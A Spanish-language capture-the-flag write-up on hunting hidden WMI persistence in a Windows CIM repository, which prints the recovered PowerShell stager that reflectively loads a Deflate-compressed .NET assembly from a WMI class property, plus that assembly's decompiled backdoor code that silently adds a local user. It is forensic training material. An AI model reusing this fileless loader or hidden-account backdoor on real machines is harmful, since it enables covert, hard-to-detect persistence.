---
title: "After Hours"
date: 2026-08-07 13:40:00 -0400
description: "Análisis forense de persistencia WMI oculta en el repositorio CIM de Windows, extracción de assembly .NET embebido y reverse engineering para obtener la flag."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [windows, persistence, wmi, reverse-engineering, dotnet, medium]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026
> - **Dificultad:** Media
> - **Categoría:** Forensics
> - **Técnicas Clave:** Análisis de repositorio WMI/CIM, extracción de payloads embebidos, descompresión Deflate, reverse engineering de assembly .NET, decodificación Base64

---

## Introducción

> *Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.*
>
> *Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.*

El reto nos entrega un archivo ZIP que, al descomprimir, contiene cinco archivos correspondientes al repositorio **WMI (CIM Repository)** de Windows:

```
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

Normalmente, estos archivos se encuentran en `C:\Windows\System32\wbem\Repository`.

> El vector de persistencia no está en Startup, Scheduled Tasks ni Registry Run keys. Es necesario revisar artefactos menos comunes.
{: .prompt-info }

---

## Reconocimiento Inicial

### Identificación del formato

```bash
$ file OBJECTS.DATA
OBJECTS.DATA: data
```

Aunque `file` no reconoce el formato directamente, los nombres (`INDEX.BTR`, `OBJECTS.DATA`, `MAPPING*.MAP`) son inconfundibles para quien haya trabajado con artefactos de Windows. Se trata del formato binario propietario de Microsoft para almacenar clases e instancias WMI.

### Primer intento con herramientas automatizadas

Probé **PyWMIPersistenceFinder** (de FireEye/Mandiant), diseñada específicamente para detectar persistencia WMI:

```bash
python2 PyWMIPersistenceFinder.py OBJECTS.DATA
```

Resultado:

```
1 FilterToConsumerBinding(s) Found.
    SCM Event Log Consumer-SCM Event Log Filter
        (Common binding based on consumer and filter names, possibly legitimate)
```

Solo detectó el binding legítimo del Service Control Manager. **Nada malicioso** por el camino clásico de `EventFilter` → `EventConsumer`.

> Las herramientas de persistencia WMI clásicas no detectan este vector porque no sigue el patrón estándar Filter→Consumer.
{: .prompt-warning }

---

## Análisis Manual del Repositorio

### Búsqueda de patrones con strings

Dado que las herramientas automatizadas no encontraron nada, pasé a inspeccionar el binario directamente:

```bash
strings -n 8 OBJECTS.DATA > strings_output.txt
```

Buscando blobs Base64 largos:

```bash
grep -oE '[A-Za-z0-9+/]{60,}={0,2}' strings_output.txt | sort -u | head -50
```

Entre el ruido de hashes y configuraciones de GPO, apareció un blob que comenzaba con:

```
JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBIAGEAcgBkAHcAYQByAGUAVABlAGwAZQBtAGUAdAByAHkAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAG4AZgBpAGcARABhAHQAYQAnAF0ALgBWAGEAbAB1AGUAOwANAAo...
```

### Decodificación del stager

El patrón `JAB...` en Base64 es clásico de **PowerShell con encoding UTF-16LE** (el formato usado por `powershell -EncodedCommand`). Al decodificarlo:

```bash
echo "JABmAGkAbABlAC..." | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Obtuve el **stager** completo:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String($file),
    [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

**Traducción del comportamiento:**
1. Lee la propiedad `ConfigData` de la clase WMI `Win32_HardwareTelemetry`.
2. Decodifica Base64 → descomprime con Deflate.
3. Carga el resultado como un **assembly .NET en memoria** y ejecuta su `EntryPoint`.

> Ya identificamos el nombre exacto de la clase maliciosa (`Win32_HardwareTelemetry`) y la propiedad que contiene el payload (`ConfigData`).
{: .prompt-tip }

---

## Extracción del Payload

### Localización binaria

Busqué los offsets exactos dentro de `OBJECTS.DATA`:

```bash
grep -aob "HardwareTelemetry" OBJECTS.DATA
grep -aob "ConfigData" OBJECTS.DATA
```

Resultados consistentes en 4 ubicaciones:

```
578864:HardwareTelemetry    → 578883:ConfigData
2659632:HardwareTelemetry   → 2659651:ConfigData
9286960:HardwareTelemetry   → 9286979:ConfigData
22467888:HardwareTelemetry  → 22467907:ConfigData
```

Inspección hexadecimal del contexto:

```bash
xxd -s 578864 -l 2048 OBJECTS.DATA
```

La estructura era clara:

```
HardwareTelemetry��ConfigData...header binario...string��<BLOB_BASE64>
```

Esto confirmaba que el reto usaba un **formato custom simplificado** para almacenar la propiedad, no el binario CIM nativo completo.

### Script de extracción automática

Para evitar errores de copiar/pegar a mano desde un archivo de 24 MB, escribí un script Python:

```python
#!/usr/bin/env python3
import re, base64, zlib, sys

FILENAME = "OBJECTS.DATA"

with open(FILENAME, "rb") as f:
    data = f.read()

marker = b"ConfigData"
positions = [m.start() for m in re.finditer(re.escape(marker), data)]

b64_char = re.compile(rb'[A-Za-z0-9+/]')
results = []

for pos in positions:
    window = data[pos:pos+80]
    idx = window.find(b"string")
    if idx == -1:
        continue
    start = pos + idx + len(b"string")
    while data[start] == 0:
        start += 1

    end = start
    while end < len(data) and b64_char.match(data[end:end+1]):
        end += 1
    while end < len(data) and data[end:end+1] == b'=':
        end += 1

    raw_b64 = data[start:end]
    results.append((pos, raw_b64))

results.sort(key=lambda x: len(x[1]), reverse=True)
best_pos, best_b64 = results[0]

raw = base64.b64decode(best_b64)

for label, wbits in [("raw deflate (-15)", -15), ("zlib header (15)", 15), ("gzip (31)", 31)]:
    try:
        dec = zlib.decompress(raw, wbits)
        with open("configdata_decompressed.bin", "wb") as out:
            out.write(dec)
        print(f"[+] {label}: {len(dec)} bytes")
        print(f"[*] Es PE? {dec[:2] == b'MZ'}")
        break
    except Exception as e:
        print(f"[!] Fallo {label}: {e}")
```

Resultado de la ejecución:

```
[*] Encontradas 4 ocurrencias de 'ConfigData'
[+] Usando el candidato del offset 578883, longitud 2212
[+] Base64 decodificado OK: 1658 bytes
[+] Descompresion exitosa con raw deflate (-15): 4096 bytes
[+] Guardado en configdata_decompressed.bin
[*] Primeros bytes (hex): 4d5a90000300000004000000ffff0000
[*] Es PE? (MZ header): True
```

¡Era un **PE32 ejecutable .NET** de exactamente 4096 bytes!

---

## Reverse Engineering del Assembly .NET

### Inspección inicial

```bash
$ file configdata_decompressed.bin
PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

`strings` no mostró la flag en UTF-8 ni UTF-16LE. Era hora de ver el código IL.

### Decompilación con monodis

```bash
monodis --output=afterhours.il configdata_decompressed.bin
cat afterhours.il
```

El IL reveló la clase `AfterHours.Program` con su método `Main()`:

```il
.method public static hidebysig default void Main ()  cil managed
{
    .entrypoint
    .maxstack 3
    .locals init (class [System]System.Diagnostics.ProcessStartInfo V_0)
    .try {
        IL_0000:  call string class [mscorlib]System.Environment::get_MachineName()
        IL_0005:  ldstr "bytelotusdc"
        IL_000a:  ldc.i4.5
        IL_000b:  call bool string::Equals(string, string, valuetype [mscorlib]System.StringComparison)
        IL_0010:  brfalse.s IL_0045

        IL_0012:  newobj instance void class [System]System.Diagnostics.ProcessStartInfo::'.ctor'()
        IL_0017:  stloc.0
        IL_0018:  ldloc.0
        IL_0019:  ldstr "cmd.exe"
        IL_001e:  callvirt instance void class [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
        IL_0023:  ldloc.0
        IL_0024:  ldstr "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add"
        IL_0029:  callvirt instance void class [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
        IL_002e:  ldloc.0
        IL_002f:  ldc.i4.1
        IL_0030:  callvirt instance void class [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(...)
        IL_0035:  ldloc.0
        IL_0036:  ldc.i4.1
        IL_0037:  callvirt instance void class [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
        IL_003c:  ldloc.0
        IL_003d:  call class [System]System.Diagnostics.Process class [System]System.Diagnostics.Process::Start(...)
        IL_0042:  pop
        IL_0043:  br.s IL_004f

        IL_0045:  ldstr "Execution halted: Environment mismatch."
        IL_004a:  call void class [mscorlib]System.Console::WriteLine(string)
        IL_004f:  leave.s IL_0054
    }
    catch class [mscorlib]System.Object {
        IL_0051:  pop
        IL_0052:  leave.s IL_0054
    }
    IL_0054:  ret
}
```

### Traducción a C#

```csharp
public static void Main()
{
    try {
        if (Environment.MachineName.Equals("bytelotusdc", StringComparison.OrdinalIgnoreCase))
        {
            var psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            Process.Start(psi);
        }
        else
        {
            Console.WriteLine("Execution halted: Environment mismatch.");
        }
    }
    catch { }
}
```

El malware es un **backdoor** que:
- Verifica que el hostname sea `bytelotusdc`.
- Si coincide, ejecuta silenciosamente `net user patch <password> /add`.
- La contraseña está codificada en **Base64**.

> El payload verifica el hostname antes de ejecutar. Esto es una técnica común de sandbox evasion.
{: .prompt-tip }

---

## Obtención de la Flag

```bash
$ echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
THM{P4tch_0p3ned_th3_BacKd00r}
```

**Flag:** `THM{P4tch_0p3ned_th3_BacKd00r}`

---

## Análisis del Vector de Persistencia

| Componente | Descripción |
|------------|-------------|
| **Ubicación** | Repositorio WMI (`C:\Windows\System32\wbem\Repository\`) |
| **Clase maliciosa** | `Win32_HardwareTelemetry` (nombre que imita clases legítimas) |
| **Propiedad** | `ConfigData` |
| **Formato del payload** | String Base64 → comprimido con Deflate |
| **Stager** | Script PowerShell (probablemente en otro mecanismo de persistencia) |
| **Payload final** | Assembly .NET de 4KB cargado reflectivamente en memoria |
| **Acción** | Crea usuario local `patch` con la flag como contraseña |
| **Condición** | Solo ejecuta si `MachineName == "bytelotusdc"` |

### ¿Por qué es difícil de detectar?

- No usa **Startup**, **Scheduled Tasks** ni **Registry Run keys**.
- No hay un `FilterToConsumerBinding` WMI clásico (por eso PyWMIPersistenceFinder falló).
- El payload vive dentro de la **definición de una clase WMI custom**, no en una instancia separada.
- El assembly .NET se ejecuta **completamente en memoria** (reflective load), sin tocar disco.

---

## Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| `file`, `strings`, `grep` | Reconocimiento inicial y búsqueda de patrones |
| `PyWMIPersistenceFinder.py` | Detección de persistencia WMI clásica (falló en este caso) |
| `python-cim` / `flare-wmi` | Parser del repositorio CIM (instalado, no fue necesario al final) |
| `xxd` | Inspección hexadecimal |
| Python (`base64`, `zlib`) | Extracción y decodificación del payload |
| `monodis` | Decompilación IL del assembly .NET |
| `base64 -d` | Decodificación final de la flag |

---

## Conclusión / Retroalimentación

Este reto fue una excelente demostración de cómo la persistencia puede ocultarse en lugares que las herramientas automatizadas no suelen revisar. Los aprendizajes clave incluyen:

1. **No confiar solo en herramientas automatizadas**: PyWMIPersistenceFinder no detectó la persistencia porque no seguía el patrón clásico Filter→Consumer. Siempre es necesario complementar con análisis manual.

2. **Inspeccionar el binario a mano**: `strings` + contexto (`xxd`) fueron clave para ubicar el stager PowerShell. A veces la información más valiosa está escondida en plain sight dentro de archivos binarios.

3. **Entender el formato de almacenamiento**: El payload estaba embebido como valor por defecto de una propiedad de clase WMI, no como instancia. Este detalle de implementación hizo la diferencia entre encontrar y no encontrar el vector.

4. **Analizar assemblies .NET**: Cuando `strings` no muestra nada, el IL (vía `monodis`, `ilspycmd` o `dnSpy`) revela la lógica real. El análisis de IL puede parecer intimidante al principio, pero con práctica se vuelve una habilidad fundamental.

En general, el reto tuvo una dificultad bien calibrada: no era trivial, pero cada paso tenía sentido lógico y recompensaba la curiosidad del analista. La combinación de forense, persistencia avanzada y reverse engineering lo convierte en un desafío muy completo y educativo.

---

*Writeup escrito el 7 de agosto de 2026. Reto resuelto durante el evento Hacker Holidays 2026 de TryHackMe.*
